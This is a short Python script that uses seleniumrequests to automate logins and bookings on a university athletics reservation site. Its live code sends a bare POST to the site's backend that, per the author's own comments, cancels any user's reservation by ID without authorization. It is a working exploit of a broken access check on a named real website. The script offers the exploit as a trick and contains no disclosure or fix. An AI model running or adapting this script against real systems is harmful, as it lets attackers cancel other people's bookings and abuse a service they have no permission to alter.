"""
Developed by: Robert Mazza
no one should be able to posses this power...
"""

import datetime
import time
from seleniumrequests import Chrome
import functions
import json

# Load the user data from JSON file
with open('user_data.json') as f:
    user_data = json.load(f)

# path of the webdriver
DRIVER_PATH = user_data["webdriver_path"]
driver = Chrome(DRIVER_PATH)  # open chrome driver

"""
print(">>> Logging in as: %s" % user_data["email"])
functions.login(user_data["email"], user_data["password"], driver)

response = driver.request('POST', 'https://www.laurierathletics.com/ecommerce/user/backendcrud.php',
                              data={"waiver1": "Agree", "waiver2": "Agree", "SlotID": "1431", "makereservation": "1"})
print(response.status_code)
"""
# This shouldn't work, but it does LOL
# CANCEL RESERVATION OF ANYONE!!!! (very secure)


response = driver.request('POST', 'https://www.laurierathletics.com/ecommerce/user/backendcrud.php',
                          data={"ReservationID": "", "reservationcancel": "1"})
